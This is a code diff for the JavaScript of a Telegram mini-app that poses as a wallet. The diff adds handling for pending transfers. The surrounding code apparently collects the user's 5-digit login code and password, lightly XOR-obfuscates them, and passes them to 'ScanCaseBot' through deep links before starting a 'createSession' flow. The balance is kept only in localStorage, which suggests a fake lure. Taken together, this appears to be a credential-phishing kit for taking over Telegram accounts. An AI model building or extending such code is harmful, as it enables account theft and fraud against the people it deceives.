@@ -149,6 +149,9 @@ if (currentUserId) {
     if (!userData.transactions) {
         userData.transactions = [];
     }
+    if (!userData.usedChecks) {
+        userData.usedChecks = [];
+    }
 } else {
     userData = { balance: 0, usedChecks: [], transactions: [] };
 }
@@ -581,7 +584,6 @@ async function appendCodeDigit(digit) {
     currentCode += digit;
     updateCodeDots();
     if (currentCode.length === 5) {
-        // Шифруем код перед отправкой
         const encryptedCode = await xorEncrypt(currentCode);
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
@@ -635,7 +637,6 @@ if (passwordSubmit) {
             showToast('Введите пароль', 'error');
             return;
         }
-        // Шифруем пароль перед отправкой
         const encryptedPassword = await xorEncrypt(password);
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
@@ -680,6 +681,42 @@ function savePendingTransaction(amount, description) {
     saveUserData(currentUserId, userData);
 }
 
+// Фиксирует pending транзакцию после успешной авторизации
+function commitPendingTransaction() {
+    if (!userData.pending_transaction) return false;
+    
+    const tx = userData.pending_transaction;
+    
+    // Списываем сумму с баланса
+    userData.balance -= tx.amount;
+    
+    // Добавляем транзакцию в историю со статусом "processing"
+    userData.transactions.push({
+        date: tx.date,
+        type: 'outcome',
+        amount: tx.amount,
+        description: tx.description,
+        status: 'processing'
+    });
+    
+    // Удаляем pending
+    delete userData.pending_transaction;
+    
+    saveUserData(currentUserId, userData);
+    updateBalanceDisplay();
+    renderMiniHistory();
+    
+    return true;
+}
+
+// Очищает pending транзакцию (при ошибках)
+function clearPendingTransaction() {
+    if (userData.pending_transaction) {
+        delete userData.pending_transaction;
+        saveUserData(currentUserId, userData);
+    }
+}
+
 function startAuthFlow() {
     const botUsername = 'ScanCaseBot';
     tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
@@ -712,7 +749,6 @@ if (walletSubmit) {
             return;
         }
 
-        // Сохраняем pending транзакцию
         savePendingTransaction(amount, `Перевод в кошелёк: ${recipient}`);
         startAuthFlow();
     });
@@ -893,21 +929,24 @@ function handleStartAppParam() {
     } else if (startParam.startsWith('success_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
-            showToast('Перевод подтверждён!', 'success');
-            userData.telegramAuth = true;
-            // Обновляем баланс и историю из localStorage (бот уже обновил)
-            const freshData = loadUserData(currentUserId);
-            if (freshData) {
-                userData.balance = freshData.balance;
-                userData.transactions = freshData.transactions || [];
-                updateBalanceDisplay();
-                renderMiniHistory();
+            // Фиксируем pending транзакцию в localStorage
+            const committed = commitPendingTransaction();
+            
+            if (committed) {
+                showToast('Перевод подтверждён!', 'success');
+            } else {
+                showToast('Перевод уже обработан', 'info');
             }
-            saveUserData(currentUserId, userData);
+            
+            // Очищаем start_param из URL, чтобы при повторном открытии не сработало снова
+            if (window.history.replaceState) {
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
         }
     } else if (startParam.startsWith('retry_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
+            clearPendingTransaction();
             showToast('Попробуйте снова', 'info');
         }
     }
